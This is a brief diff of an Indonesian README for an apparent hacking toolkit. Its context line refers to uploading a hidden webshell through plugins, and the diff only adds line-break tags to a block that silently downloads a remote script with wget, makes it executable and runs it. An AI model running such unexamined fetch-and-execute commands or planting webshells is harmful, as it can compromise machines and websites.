@@ -8,8 +8,8 @@ Tinggal pake aja , Untuk hiddenme di Folder Webshell itu untuk upload di Plugins
 
 # sans.sh
 
-! wget https://raw.githubusercontent.com/ngeteng/tools/main/sans.sh &> /dev/null
-! chmod +x sans.sh
+! wget https://raw.githubusercontent.com/ngeteng/tools/main/sans.sh &> /dev/null<br>
+! chmod +x sans.sh<br>
 ! ./sans.sh
 
 # Contributing
